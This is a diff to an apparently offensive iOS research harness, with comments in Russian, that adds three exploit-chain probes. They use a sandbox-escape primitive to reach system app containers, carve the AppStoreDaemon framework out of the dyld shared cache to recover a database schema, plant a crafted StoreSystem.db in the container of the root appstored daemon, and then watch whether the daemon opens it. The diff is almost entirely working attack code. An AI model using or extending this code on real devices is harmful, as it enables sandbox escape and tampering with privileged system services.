@@ -48458,6 +48458,297 @@ static void p_bq119(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq120 — v280: карвинг AppStoreDaemon dylib (схема StoreSystem.db) + FrontBoard.
+// ASUSQLite*-классы и CREATE TABLE для StoreSystem.db/StoreUser.db живут в
+// AppStoreDaemon.framework dylib (dsc) — appstored-бинарь содержит только
+// ссылки. Нужна схема для crafted-DB теста цепочки appstored (root, mach=19).
+static void p_bq120(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq120] v280: карвинг AppStoreDaemon dylib (§272-next)");
+    fsync(fileno(stderr));
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq120] CONTROL §170 -> handle %lld%s", (long long)h,
+        h < 0 ? " *** NO ESCAPE ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) return;
+
+    const char *candirs[] = {
+        "/private/preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld",
+        "/System/Library/Caches/com.apple.dyld",
+        "/System/Library/dyld",
+        "/private/var/db/dyld",
+    };
+    char cdir[1024] = {0};
+    for (unsigned i = 0; i < sizeof(candirs)/sizeof(candirs[0]) && !cdir[0]; i++) {
+        DIR *pd = opendir(candirs[i]);
+        if (!pd) continue;
+        struct dirent *pe;
+        while ((pe = readdir(pd)))
+            if (strstr(pe->d_name, "dyld_shared_cache_arm64e")) {
+                snprintf(cdir, sizeof(cdir), "%s", candirs[i]); break;
+            }
+        closedir(pd);
+    }
+    if (!cdir[0]) { LOG("[bq120] кэш-каталог не найден"); bad_query_release(h); return; }
+
+    NSMutableArray *subs = [NSMutableArray array];
+    NSString *headFile = nil;
+    DIR *cd = opendir(cdir);
+    struct dirent *ce;
+    while (cd && (ce = readdir(cd))) {
+        if (ce->d_name[0] == '.') continue;
+        if (strstr(ce->d_name, ".symbols")) continue;
+        if (!strstr(ce->d_name, "dyld_shared_cache")) continue;
+        char p[1400];
+        snprintf(p, sizeof(p), "%s/%s", cdir, ce->d_name);
+        struct stat st;
+        if (stat(p, &st) == 0 && S_ISREG(st.st_mode)) {
+            [subs addObject:[NSString stringWithUTF8String:p]];
+            if (!strchr(ce->d_name, '.')) headFile = [NSString stringWithUTF8String:p];
+        }
+    }
+    if (cd) closedir(cd);
+    if (!headFile) headFile = subs[0];
+
+    int fd = open(headFile.fileSystemRepresentation, O_RDONLY);
+    struct stat cst; fstat(fd, &cst);
+    uint64_t fsize = (uint64_t)cst.st_size;
+    void *map = mmap(NULL, (size_t)fsize, PROT_READ, MAP_FILE | MAP_PRIVATE, fd, 0);
+    if (fd < 0 || map == MAP_FAILED) {
+        LOG("[bq120] head errno %d", errno);
+        if (fd >= 0) close(fd);
+        bad_query_release(h); return;
+    }
+    struct bq14_cache_header *hdr = (struct bq14_cache_header *)map;
+    uint32_t imgOff = 0, imgCnt = 0; BOOL found = NO;
+    for (uint32_t o4 = 0x18; o4 + 8 <= hdr->mappingOffset && !found; o4 += 4) {
+        uint32_t o = ((uint32_t *)((char *)hdr + o4))[0];
+        uint32_t c = ((uint32_t *)((char *)hdr + o4))[1];
+        if (c < 100 || c > 40000) continue;
+        if (!o || (uint64_t)o + (uint64_t)c * 32 > fsize) continue;
+        BOOL ok = YES;
+        for (int probe = 0; probe < 3 && ok; probe++) {
+            uint32_t idx = probe == 0 ? 0 : (probe == 1 ? c / 2 : c - 1);
+            uint64_t raw[4] = {0,0,0,0};
+            memcpy(raw, (char *)map + o + (uint64_t)idx * 32, 32);
+            char pth[400];
+            if (!bq14_path_at(fd, raw[3], fsize, pth, sizeof(pth))) ok = NO;
+        }
+        if (ok) { imgOff = o; imgCnt = c; found = YES; }
+    }
+    if (!found) {
+        LOG("[bq120] таблица образов НЕ валидирована");
+        munmap(map, (size_t)fsize); close(fd); bad_query_release(h); return;
+    }
+    LOG("[bq120] images: off=0x%x cnt=%u", imgOff, imgCnt);
+
+    static const char *targets[] = {
+        "/System/Library/PrivateFrameworks/AppStoreDaemon.framework/AppStoreDaemon",
+        "/System/Library/PrivateFrameworks/AppStoreServices.framework/AppStoreServices",
+    };
+    static const char *needles[] = {
+        "StoreSystem.db", "StoreUser.db", "CREATE TABLE", "ASUSQLite",
+    };
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+
+    for (unsigned t = 0; t < sizeof(targets)/sizeof(targets[0]); t++) {
+        uint64_t addr = 0;
+        for (uint32_t i = 0; i < imgCnt; i++) {
+            uint64_t raw[4] = {0,0,0,0};
+            memcpy(raw, (char *)map + imgOff + (uint64_t)i * 32, 32);
+            char pth[400];
+            if (!bq14_path_at(fd, raw[3], fsize, pth, sizeof(pth))) continue;
+            if (strcmp(pth, targets[t]) == 0) { addr = raw[0]; break; }
+        }
+        if (!addr) { LOG("[bq120] %s: НЕ в таблице", targets[t]); continue; }
+        uint64_t next = ~0ULL;
+        for (uint32_t i = 0; i < imgCnt; i++) {
+            uint64_t raw[4] = {0,0,0,0};
+            memcpy(raw, (char *)map + imgOff + (uint64_t)i * 32, 32);
+            if (raw[0] > addr && raw[0] < next) next = raw[0];
+        }
+        uint64_t want = (next == ~0ULL ? 0x2000000ULL : next - addr);
+        if (want > 0x2000000ULL) want = 0x2000000ULL;
+        LOG("[bq120] %s @0x%llx want=%llu", strrchr(targets[t],'/')+1,
+            (unsigned long long)addr, (unsigned long long)want);
+
+        unsigned char *buf = (unsigned char *)calloc(1, (size_t)want);
+        uint64_t filled = 0;
+        for (NSString *sf in subs) {
+            int sfd = open(sf.fileSystemRepresentation, O_RDONLY);
+            if (sfd < 0) continue;
+            struct bq14_cache_header sh = {0};
+            if (pread(sfd, &sh, sizeof(sh), 0) != sizeof(sh) ||
+                memcmp(sh.magic, "dyld_v1", 7) != 0 ||
+                sh.mappingCount > 64 || sh.mappingOffset > (1u << 20)) {
+                close(sfd); continue;
+            }
+            struct bq14_mapping_info mm[64];
+            memset(mm, 0, sizeof(mm));
+            if (pread(sfd, mm, sh.mappingCount * sizeof(struct bq14_mapping_info),
+                      sh.mappingOffset) !=
+                (ssize_t)(sh.mappingCount * sizeof(struct bq14_mapping_info))) {
+                close(sfd); continue;
+            }
+            for (uint32_t m = 0; m < sh.mappingCount; m++) {
+                uint64_t ma = mm[m].address, msz = mm[m].size,
+                         mfo = mm[m].fileOffset;
+                if (ma + msz <= addr || ma >= addr + want) continue;
+                uint64_t i0 = (ma > addr) ? ma : addr;
+                uint64_t i1 = (ma + msz < addr + want) ? ma + msz : addr + want;
+                if (i1 <= i0) continue;
+                uint64_t rel = i0 - addr, chunk = i1 - i0;
+                unsigned char *tmp = (unsigned char *)malloc((size_t)chunk);
+                ssize_t got = pread(sfd, tmp, (size_t)chunk,
+                                    (off_t)(mfo + (i0 - ma)));
+                if (got == (ssize_t)chunk) {
+                    memcpy(buf + rel, tmp, (size_t)chunk);
+                    filled += chunk;
+                }
+                free(tmp);
+            }
+            close(sfd);
+        }
+        uint32_t magic0 = *(uint32_t *)buf;
+        LOG("[bq120]   filled %llu/%llu magic=%s",
+            (unsigned long long)filled, (unsigned long long)want,
+            magic0 == 0xFEEDFACF ? "MH_64 OK" : "BAD");
+        for (unsigned k = 0; k < sizeof(needles)/sizeof(needles[0]); k++) {
+            void *hit = memmem(buf, (size_t)want, needles[k], strlen(needles[k]));
+            if (hit)
+                LOG("[bq120]   needle %-16s FOUND @+0x%llx", needles[k],
+                    (unsigned long long)((unsigned char *)hit - buf));
+        }
+        NSString *out = [docs stringByAppendingPathComponent:
+            [NSString stringWithFormat:@"carve-%s.bin", strrchr(targets[t],'/')+1]];
+        FILE *o = fopen(out.fileSystemRepresentation, "wb");
+        if (o) { fwrite(buf, 1, (size_t)want, o); fclose(o);
+            LOG("[bq120]   saved -> %@", out.lastPathComponent); }
+        free(buf);
+        fsync(fileno(stderr));
+    }
+    munmap(map, (size_t)fsize);
+    close(fd);
+    bad_query_release(h);
+    LOG("[bq120] ИТОГ: AppStoreDaemon вырезан");
+    fsync(fileno(stderr));
+}
+
+// p_bq121 — v281: ПОДЛОЖКА StoreSystem.db в контейнер appstored (root, §272).
+// Схема собрана из бинаря appstored (39 CREATE, timestamp()→0). Цель — проверка
+// ЦЕПОЧКИ: пишет ли appstored -wal/-shm рядом с нашей БД (доказательство
+// открытия) при триггере (App Store activity). Контроль §144: read-back
+// byte-exact + до/после stat-снапшот контейнера.
+static void p_bq121(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq121] v281: подложка StoreSystem.db → appstored (§272-next)");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq121] escape FAIL"); return; }
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+
+    const char *dst = "/var/containers/Data/System/3E27999E-F441-4625-A423-AF11E87F71E8/Library/StoreSystem.db";
+    const char *srcp = [[docs stringByAppendingPathComponent:@"StoreSystem.db"]
+                        fileSystemRepresentation];
+
+    // --- снапшот ДО ---
+    {
+        char dirp[1100];
+        snprintf(dirp, sizeof(dirp),
+                 "/var/containers/Data/System/3E27999E-F441-4625-A423-AF11E87F71E8/Library");
+        DIR *dd = opendir(dirp);
+        LOG("[bq121] ДО: Library/:");
+        if (dd) {
+            struct dirent *de; int c = 0;
+            while ((de = readdir(dd)) && c < 30) {
+                if (de->d_name[0] == '.') continue;
+                c++;
+                char fp[1400];
+                snprintf(fp, sizeof(fp), "%s/%s", dirp, de->d_name);
+                struct stat st = {0};
+                if (stat(fp, &st) == 0)
+                    LOG("[bq121]   %s: %lld", de->d_name, (long long)st.st_size);
+            }
+            closedir(dd);
+        }
+        fsync(fileno(stderr));
+    }
+
+    // --- читаем исходник ---
+    FILE *sf = fopen(srcp, "rb");
+    if (!sf) { LOG("[bq121] Documents/StoreSystem.db отсутствует (закинь через devicectl)"); bad_query_release(h); return; }
+    fseek(sf, 0, SEEK_END); long sz = ftell(sf); fseek(sf, 0, SEEK_SET);
+    if (sz <= 0 || sz > 16*1024*1024) { fclose(sf); LOG("[bq121] размер подозрительный: %ld", sz); bad_query_release(h); return; }
+    unsigned char *buf = (unsigned char *)malloc((size_t)sz);
+    if (fread(buf, 1, (size_t)sz, sf) != (size_t)sz) { fclose(sf); free(buf); LOG("[bq121] read FAIL"); bad_query_release(h); return; }
+    fclose(sf);
+    LOG("[bq121] источник: %ld байт", sz);
+
+    struct stat stx = {0};
+    if (stat(dst, &stx) == 0) {
+        LOG("[bq121] ВНИМАНИЕ: StoreSystem.db уже существует (%lld байт) — НЕ трогаем, только отчёт", (long long)stx.st_size);
+        free(buf); bad_query_release(h); return;
+    }
+
+    // --- пишем ---
+    FILE *df = fopen(dst, "wb");
+    if (!df) { LOG("[bq121] dst fopen FAIL errno %d", errno); free(buf); bad_query_release(h); return; }
+    fwrite(buf, 1, (size_t)sz, df);
+    fflush(df); fsync(fileno(df)); fclose(df);
+    LOG("[bq121] записан %ld байт", sz);
+
+    // --- контроль: read-back ---
+    FILE *vf = fopen(dst, "rb");
+    if (!vf) { LOG("[bq121] verify open FAIL"); free(buf); bad_query_release(h); return; }
+    unsigned char *vbuf = (unsigned char *)malloc((size_t)sz);
+    size_t vr = fread(vbuf, 1, (size_t)sz, vf);
+    fclose(vf);
+    int same = (vr == (size_t)sz) && (memcmp(vbuf, buf, (size_t)sz) == 0);
+    LOG("[bq121] read-back: %zu/%ld байт, byte-identical=%d %s",
+        vr, sz, same, same ? "*** OK ***" : "*** MISMATCH ***");
+    free(vbuf); free(buf);
+    fsync(fileno(stderr));
+
+    bad_query_release(h);
+    LOG("[bq121] ИТОГ: БД подложена. Триггер: открой App Store, затем p_bq122.");
+    fsync(fileno(stderr));
+}
+
+// p_bq122 — наблюдение: открыл ли appstored нашу БД (появление -wal/-shm,
+// изменение mtime, удаление/пересоздание).
+static void p_bq122(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq122] v281: наблюдение StoreSystem.db после триггера");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq122] escape FAIL"); return; }
+    char dirp[1100];
+    snprintf(dirp, sizeof(dirp),
+             "/var/containers/Data/System/3E27999E-F441-4625-A423-AF11E87F71E8/Library");
+    DIR *dd = opendir(dirp);
+    if (dd) {
+        struct dirent *de; int c = 0;
+        LOG("[bq122] Library/ ПОСЛЕ:");
+        while ((de = readdir(dd)) && c < 30) {
+            if (de->d_name[0] == '.') continue;
+            c++;
+            char fp[1400];
+            snprintf(fp, sizeof(fp), "%s/%s", dirp, de->d_name);
+            struct stat st = {0};
+            if (stat(fp, &st) == 0)
+                LOG("[bq122]   %s: %lld байт mtime=%ld uid=%d", de->d_name,
+                    (long long)st.st_size, (long)st.st_mtime, st.st_uid);
+        }
+        closedir(dd);
+    }
+    bad_query_release(h);
+    LOG("[bq122] ИТОГ: если StoreSystem.db-wal/-shm появились или mtime дёрнулся — appstored ОТКРЫЛ нашу БД");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -57091,6 +57382,9 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ117")) { p_bq117(); LOG("[probe13] bq117-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ118")) { p_bq118(); LOG("[probe13] bq118-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ119")) { p_bq119(); LOG("[probe13] bq119-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ120")) { p_bq120(); LOG("[probe13] bq120-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ121")) { p_bq121(); LOG("[probe13] bq121-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ122")) { p_bq122(); LOG("[probe13] bq122-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
